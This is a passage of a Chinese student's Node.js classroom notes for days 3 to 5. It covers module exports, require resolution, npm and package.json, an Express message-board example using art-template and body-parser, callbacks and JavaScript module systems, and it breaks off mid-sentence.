title="上午总结"></a>上午总结</h2><ul><li>jQuery 的 each 和 原生的 JavaScript 方法 forEach<ul><li>EcmaScript 5 提供的<ul><li>不兼容 IE 8</li></ul></li><li>jQuery 的 each 由 jQuery 这个第三方库提供<ul><li>jQuery 2 以下的版本是兼容 IE 8 的</li><li>它的 each 方法主要用来遍历 jQuery 实例对象（伪数组）</li><li>同时它也可以作为低版本浏览器中 forEach 替代品</li><li>jQuery 的实例对象不能使用 forEach 方法，如果想要使用必须转为数组才可以使用</li><li><code>[].slice.call(jQuery实例对象)</code></li></ul></li></ul></li><li>模块中导出多个成员和导出单个成员</li><li>301 和 302 状态码区别<ul><li>301 永久重定向，浏览器会记住</li><li>302 临时重定向</li></ul></li><li>exports 和 module.exports 的区别<ul><li>每个模块中都有一个 module 对象</li><li>module 对象中有一个 exports 对象</li><li>我们可以把需要导出的成员都挂载到 module.exports 接口对象中</li><li>也就是：<code>moudle.exports.xxx = xxx</code> 的方式</li><li>但是每次都 <code>moudle.exports.xxx = xxx</code> 很麻烦，点儿的太多了</li><li>所以 Node 为了你方便，同时在每一个模块中都提供了一个成员叫：<code>exports</code></li><li><code>exports === module.exports</code> 结果为  <code>true</code>s</li><li>所以对于：<code>moudle.exports.xxx = xxx</code> 的方式 完全可以：<code>expots.xxx = xxx</code></li><li>当一个模块需要导出单个成员的时候，这个时候必须使用：<code>module.exports = xxx</code> 的方式</li><li>不要使用 <code>exports = xxx</code> 不管用</li><li>因为每个模块最终向外 <code>return</code> 的是 <code>module.exports</code></li><li>而 <code>exports</code> 只是 <code>module.exports</code> 的一个引用</li><li>所以即便你为 <code>exports = xx</code> 重新赋值，也不会影响 <code>module.exports</code></li><li>但是有一种赋值方式比较特殊：<code>exports = module.exports</code> 这个用来重新建立引用关系的</li><li>之所以让大家明白这个道理，是希望可以更灵活的去用它</li></ul></li><li>Node 是一个比肩 Java、PHP 的一个平台<ul><li>JavaScript 既能写前端也能写服务端</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">moudle.exports = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新建立 exports 和 module.exports 之间的引用关系</span></span><br><span class="line"><span class="built_in">exports</span> = <span class="built_in">module</span>.exports</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.foo = <span class="string">&#x27;bar&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.mySlice = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> start = <span class="number">0</span></span><br><span class="line">  <span class="keyword">var</span> end = <span class="built_in">this</span>.length</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">arguments</span>.length === <span class="number">1</span>) &#123;</span><br><span class="line">    start = <span class="built_in">arguments</span>[<span class="number">0</span>]</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">arguments</span>.length === <span class="number">2</span>) &#123;</span><br><span class="line">    start = <span class="built_in">arguments</span>[<span class="number">0</span>]</span><br><span class="line">    end = <span class="built_in">arguments</span>[<span class="number">1</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> tmp = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">    <span class="comment">// fakeArr[0]</span></span><br><span class="line">    <span class="comment">// fakeArr[1]</span></span><br><span class="line">    <span class="comment">// fakeArr[2]</span></span><br><span class="line">    tmp.push(<span class="built_in">this</span>[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tmp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fakeArr = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&#x27;abc&#x27;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;efg&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;haha&#x27;</span>,</span><br><span class="line">  <span class="attr">length</span>: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以你就得到了真正的数组。 </span></span><br><span class="line">[].mySlice.call(fakeArr)</span><br></pre></td></tr></table></figure><h2 id="下午总结-1"><a href="#下午总结-1" class="headerlink" title="下午总结"></a>下午总结</h2><ul><li><p>jQuery 的 each 和 原生的 JavaScript 方法 forEach</p></li><li><p>301 和 302 的区别</p></li><li><p>模块中导出单个成员和导出多个成员的方式</p></li><li><p>module.exports 和 exports 的区别</p></li><li><p>require 方法加载规则</p><ul><li>优先从缓存加载</li><li>核心模块</li><li>路径形式的模块</li><li>第三方模块<ul><li>node_modules</li></ul></li></ul></li><li><p>package.json 包描述文件</p><ul><li>dependencies 选项的作用</li></ul></li><li><p>npm 常用命令</p><p>node pachage manager</p><p>package.json包描述文件，项目的说明书，说明了该项目依赖的包。每个项目中都要有一个</p><p>npm init生成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ npm init</span><br><span class="line">This utility will walk you through creating a package.json file.</span><br><span class="line">It only covers the most common items, and tries to guess sensible defaults.</span><br><span class="line"></span><br><span class="line">See <span class="string">`npm help init`</span> <span class="keyword">for</span> definitive documentation on these fields</span><br><span class="line">and exactly what they <span class="keyword">do</span>.</span><br><span class="line"></span><br><span class="line">Use <span class="string">`npm install &lt;pkg&gt;`</span> afterwards to install a package and</span><br><span class="line">save it <span class="keyword">as</span> a dependency <span class="keyword">in</span> the package.json file.</span><br><span class="line"></span><br><span class="line">Press ^C at any time to quit.</span><br><span class="line">package name: (<span class="number">04</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最有用的是dependencies选项，可以用来帮我们保存第三方包的依赖信息</p><ul><li>npm init -y可以跳过向导，快速生成</li><li>npm install</li><li>npm install –save 包名<ul><li>下载并保存依赖项(package.json的dependencies选项)</li></ul></li><li>npm uninstall –save</li></ul></li><li><p>Express 基本使用</p><p>原生http在某些地方不足，需要框架来加快开发效率</p><p>node中有很多web开发框架，这里以学习express为主</p><p><a href="http://expressjs.com/">Express - Node.js web application framework (expressjs.com)</a></p></li><li><p>使用 Express 把之前的留言本案例自己动手改造一下</p></li></ul><h1 id="Node-js-第4天课堂笔记"><a href="#Node-js-第4天课堂笔记" class="headerlink" title="Node.js 第4天课堂笔记"></a>Node.js 第4天课堂笔记</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>Express</li><li>基于文件做一套 CRUD</li></ul><h2 id="反馈-2"><a href="#反馈-2" class="headerlink" title="反馈"></a>反馈</h2><ul><li>需要记忆的内容比较多，还是得多敲多练</li><li>竟以为老师是理工男！！！老师每天来一波惊喜吧，魅力值up up up！</li><li>老师很可爱，很喜欢，学习有动力，哈哈哈哈哈哈哈哈<ul><li> 嘤嘤嘤</li></ul></li><li>php什么的相关知识，老师可能大概也许说过，但是我清楚的知道，我是真的不知道，对我来说就是新知识。恩 所以，你没有重复</li><li>给老师点赞</li><li>QAQ<ul><li>@_@</li></ul></li></ul><h2 id="复习-2"><a href="#复习-2" class="headerlink" title="复习"></a>复习</h2><ul><li><p>jQuery 的 each 和 原生的 JavaScript 方法 forEach</p></li><li><p>301 和 302 的区别</p></li><li><p>模块中导出单个成员和导出多个成员的方式</p><ul><li><code>module.exports = xxx</code></li><li>通过多次：<code>exports.xxx = xxx</code></li><li>导出多个也可以：<code>moudle.exports = &#123;多个成员&#125;</code></li></ul></li><li><p>module.exports 和 exports 的区别</p><ul><li>exports 只是 module.exports 的一个引用而已，目的只是为了简化写法</li><li>每个模块最终 return 的是 module.exports</li></ul></li><li><p>require 方法加载规则</p><ul><li>优先从缓存加载</li><li>核心模块</li><li>路径形式的模块<ul><li><code>./xxx</code></li><li><code>../xxxx</code></li><li><code>/xxxx</code> / 在这里表示的是磁盘根路径</li><li><code>c:/xxx</code></li></ul></li><li>第三方模块<ul><li>第三方模块的标识就是第三方模块的名称（不可能有第三方模块和核心模块的名字一致）</li><li>npm<ul><li>开发人员可以把写好的框架、库发布到 npm 上</li><li>使用者在使用的时候就可以很方便的通过 npm 来下载</li></ul></li><li>使用方式：<code>var 名字 = require(&#39;npm install 的那个包名&#39;)</code></li><li>node_modules</li><li>node_modules/express</li><li>node_modules/express/package.json</li><li>node_modules/express/package.json main</li><li>如果 package.json 或者 package.json main 不成立，则查找备选项：index.js</li><li>如果以上条件都不成立，则继续进入上一级目录中的 node_modules 按照上面的规则继续查找</li><li>如果直到当前文件模块所属磁盘根目录都找不到，最后报错：<code>can not find module xxx</code></li></ul></li></ul></li><li><p>package.json 包描述文件</p><ul><li>就是产品的说明书</li><li><code>dependencies</code> 属性，用来保存项目的第三方包依赖项信息</li><li>所以建议每个项目都要有且只有一个 package.json (存放在项目的根目录)</li><li>我们可以通过 <code>npm init [--yes]</code> 来生成 package.json 文件</li><li>同样的，为了保存依赖项信息，我们每次安装第三方包的时候都要加上：<code>--save</code> 选项。</li></ul></li><li><p>npm 常用命令</p><ul><li>install</li><li>uninstall</li></ul></li><li><p>Express 基本使用</p></li><li><p>使用 Express 把之前的留言本案例自己动手改造一下</p></li></ul><h3 id="模块标识中的-和文件操作路径中的"><a href="#模块标识中的-和文件操作路径中的" class="headerlink" title="模块标识中的 / 和文件操作路径中的 /"></a>模块标识中的 <code>/</code> 和文件操作路径中的 <code>/</code></h3><h2 id="上午总结-3"><a href="#上午总结-3" class="headerlink" title="上午总结"></a>上午总结</h2><h3 id="演讲"><a href="#演讲" class="headerlink" title="演讲"></a>演讲</h3><blockquote><p>说服<br>PPT<br>脑图<br>markdown<br>结构思维</p></blockquote><ul><li><p>找痛点 why 为什么</p></li><li><p>解决方案 what 是什么</p></li><li><p>怎么去使用 how 怎么用</p></li><li><p>where 在哪儿用</p></li><li><p>when  什么时候用</p></li><li><p>文件路径中的 <code>/</code> 和模块标识中的 <code>/</code></p></li><li><p>nodemon</p><p>nodemon可以自己更新文件变化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Administrator@zx MINGW64 /f/nodejs/<span class="number">05</span></span><br><span class="line">$ nodemon app.js</span><br><span class="line">[nodemon] <span class="number">2.0</span><span class="number">.15</span></span><br><span class="line">[nodemon] to restart at any time, enter <span class="string">`rs`</span></span><br><span class="line">[nodemon] watching path(s): *.*</span><br><span class="line">[nodemon] watching extensions: js,mjs,json</span><br><span class="line">[nodemon] starting <span class="string">`node app.js`</span></span><br><span class="line">listening on port <span class="number">3000</span></span><br><span class="line">&#123;&#125;</span><br><span class="line">[nodemon] restarting due to changes...</span><br><span class="line">[nodemon] starting <span class="string">`node app.js`</span></span><br><span class="line">listening on port <span class="number">3000</span></span><br><span class="line">[nodemon] restarting due to changes...</span><br><span class="line">[nodemon] starting <span class="string">`node app.js`</span></span><br><span class="line">listening on port <span class="number">3000</span></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Express</p><ul><li>art-template 模板引擎的配置</li><li>body-parser 解析表单 POST 请求体</li></ul></li><li><p>技术只是一种解决问题的手段、工具而已</p><ul><li>第三方的东西，不要纠结</li><li>先以解决问题为主</li></ul></li><li><p>详解了 express 静态服务 API</p><ul><li>app.use(‘/public/‘, express.static(‘./public’))</li></ul></li><li><p>crud</p></li></ul><h2 id="下午总结-2"><a href="#下午总结-2" class="headerlink" title="下午总结"></a>下午总结</h2><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li><p>文件路径中的 <code>/</code> 和模块标识中的 <code>/</code></p></li><li><p>Express 中配置使用 art-template 模板引擎</p><ol><li><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save express-art-template</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.engine(<span class="string">&#x27;art&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;express-art-template&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line"><span class="comment">//express默认去views目录找</span></span><br><span class="line">res.render(<span class="string">&#x27;index.html&#x27;</span>,&#123;</span><br><span class="line"><span class="attr">title</span>:<span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>修改默认的views试图渲染存储目录</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>,目标路径)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> app=express()</span><br><span class="line">app.engine(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;express-art-template&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"><span class="comment">// routes</span></span><br><span class="line"><span class="keyword">var</span> comments = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">      <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三2&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">      <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三3&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">      <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三4&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">      <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三5&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;今天天气不错！&#x27;</span>,</span><br><span class="line">      <span class="attr">dateTime</span>: <span class="string">&#x27;2015-10-16&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line"><span class="comment">//公开文件夹目录</span></span><br><span class="line">app.use(<span class="string">&#x27;/public&#x27;</span>,express.static(<span class="string">&#x27;./public/&#x27;</span>))</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index.html&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">comments</span>:comments</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.get(<span class="string">&#x27;/post&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;post.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//以不同请求方式请求同一路径，结果不同</span></span><br><span class="line">app.post(<span class="string">&#x27;/post&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//req.query只能拿到get</span></span><br><span class="line">    <span class="comment">//插件middleware body-parser</span></span><br><span class="line">    <span class="comment">//目前使用req.body</span></span><br><span class="line">    <span class="comment">//var comment=req.query</span></span><br><span class="line">    <span class="keyword">var</span> comment=req.body</span><br><span class="line">    comment.dateTime=<span class="string">&#x27;2021-12-28 10:58:53&#x27;</span></span><br><span class="line">    comments.unshift(comment)</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="comment">//res.statusCode=302</span></span><br><span class="line">    <span class="comment">//res.setHeader(&#x27;location&#x27;,&#x27;/&#x27;)</span></span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;listening on port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>Express 中配置使用 body-parser</p><p>1.安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install body-parser</span><br></pre></td></tr></table></figure><p>2.解析</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> cache =<span class="built_in">require</span>(<span class="string">&quot;./redis.js&quot;</span>);   </span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析application/json</span></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析application/x-www-form-urlencoded</span></span><br><span class="line">app.use(bodyParser.urlencoded());</span><br><span class="line"></span><br><span class="line">上面这些要在app.use(router)之前</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>Express 中配置处理静态资源</p></li><li><p>CRUD 案例中单独提取路由模块</p></li></ul><p>回调函数</p><p>异步函数获取返回值的方法</p><p>//setTineout</p><p>//readFile</p><p>//writeFile</p><p>//ajax</p><p>//往往异步API都伴随着一个回调函数</p><p>例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&quot;demo_test.asp&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;Data: &quot;</span> + data + <span class="string">&quot;\nStatus: &quot;</span> + status);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>自己封装ajax中的get方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> oReq=<span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">oReq.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">callback(oReq.responseText)</span><br><span class="line">&#125;</span><br><span class="line">oReq.open(<span class="string">&#x27;get&#x27;</span>,url)</span><br><span class="line">oReq.send()</span><br><span class="line">&#125;</span><br><span class="line">get(<span class="string">&#x27;data.json&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y,callback</span>)</span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ret=x+y</span><br><span class="line">callback(ret)</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">10</span>,<span class="number">20</span>,<span class="function"><span class="keyword">function</span>(<span class="params">ret</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(ret)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Node-js-第5天课堂笔记"><a href="#Node-js-第5天课堂笔记" class="headerlink" title="Node.js 第5天课堂笔记"></a>Node.js 第5天课堂笔记</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>Express</li><li>MongoDB</li><li>项目<ul><li>一天半的时间</li></ul></li></ul><h2 id="反馈-3"><a href="#反馈-3" class="headerlink" title="反馈"></a>反馈</h2><ul><li><p>新版sublime 怎么格式化 怎么一起选中长度不等的内容 怎么改颜色 有的写对了也没颜色 仍然是白色</p><ul><li>HTML-CSS-JS Prettify</li></ul></li><li><p>代码量好多</p><ul><li>真正的开发是咱们这个小案例的无数倍</li></ul></li><li><p>callback是不是相当于函数自调用?</p><ul><li>很简单，函数也是一种数据类型，既可以当作参数进行传递，也可以当作方法的返回值</li></ul></li><li><p>我们现在用的模块化是CMD吧 老师能不能给我们扩展一下AMD</p><ul><li>PHP 中为什么就可以直接 <code>require</code>、<code>include</code> 因为 PHP 当初在设计的时候就加入了这个功能</li><li>PHP 这门语言天生就支持</li><li>模块作用域</li><li>可以使用 API 来进行文件与文件之间的依赖加载</li><li>在 Node 这个环境中对 JavaScript 进行了特殊的模块化支持 CommonJS</li><li>JavaScript 天生不支持模块化<ul><li>require</li><li>exports</li><li>Node.js 才有的</li></ul></li><li>在浏览器中也可以像在 Node 中的模块一样来进行编程<ul><li><code>&lt;script&gt;</code> 标签来引用加载，而且你还必须考虑加载的顺序问题</li><li>require.js 第三方库 AMD</li><li>sea.js     第三方库 CMD</li></ul></li><li>无论是 CommonJS、AMD、CMD、UMD、EcmaScript 6 Modules 官方规范<ul><li>都是为了解决 JavaScript 的模块化问题</li><li>CommonJS、AMD、CMD 都是民间搞出来的</li><li>EcmaScript 是官方规范定义</li><li>官方看民间都在乱搞，开发人员为了在不同的环境使用不同的 JavaScript 模块化解决方案</li><li>所以 EcmaScript 在 2015 年发布了 EcmaScript 2016 官方标准</li><li>其中就包含了官方对 JavaScript 模块化的支持</li><li>也就是说语言天生就支持了</li><li>但是虽然标准已经发布了，但是很多 JavaScript 运行换将还不支持</li><li>Node 也是只在 8.5 版本之后才对 EcmaScript 6 module 进行了支持</li><li>后面学 Vue 的时候会去学习</li><li>less 编译器 &gt; css</li><li>EcmaScript 6 -&gt; 编译器 -&gt; EcmaScript 5</li><li>目前的前端情况都是使用很多新技术，然后利用编译器工具打包可以在低版本浏览器运行。</li><li>使用新技术的目的就是为了提高效率，增加可维护性</li></ul></li></ul></li><li><p>内心极度脆弱。。。有心杀敌 无力回天，总感觉时间不够用。</p><ul><li>不要猥琐发育，就得浪</li></ul></li><li><p>虽然比较多 但是因为老师讲的很清晰 还是愿意去写的 对于 node.js 的奥义 封装异步的API 就是需要多练</p></li><li><p>老师讲的很清晰 讲课也很洒脱 老师是不是被夸的已经习惯了 后面讲的回掉函数有点懵了</p></li><li><p>老师讲的很好，思路清晰，项目跟着老师的笔记一步一步敲，so easy</p></li><li><p>觉得老师讲课真的超级棒啊 传智的实力担当 双击没毛病 老铁666</p></li><li><p>都坐下 基本操作 哇,老师,一般敢说这句话的都是大神,我还是个菜鸟,学的那是一脸懵逼</p></li><li><p>有点懵，看着老师的思路做，可是还是不知道从何入手，唉。。。</p><ul><li> 本着达芬奇画鸡蛋的精神</li><li> 《使徒行者》三哥</li><li>《反黑》陈小春<ul><li> 卧底 8年卧底</li><li> 文职工作</li><li> 报了电脑版</li><li> 吃饭都在看书</li><li> 学习 -》吃饭也是看书</li><li> 边角余料</li></ul></li></ul></li><li><p>var router = require(‘./router’) 这一步不是加载router.js并执行该文件吗 为什么还要执行app.use(router) app.use 不是开放静态资源吗 app.use(router)在这里是什么意思，挂载到 app 服务中的意思是？ module.exports = app 也不懂</p><ul><li>这里涉及到一个中间件的概念</li><li>app.use 不仅仅是用来处理静态资源的</li><li>还可以做很多工作</li><li>配置 body-parse 也是通过 app.use 来配置的</li><li>这叫中间件，其中有一套规则</li></ul></li><li><p>npm init –yes 生成一个package.json 文件 npm –save 文件名 又生成一个package-lock.json文件,又生成的文件和初始化生成的文件有区别吗?</p><p> npm5之前没有package.json</p><p> npm5以后才加入了这个文件</p><ul><li>当你安装包的时候，新版的 npm 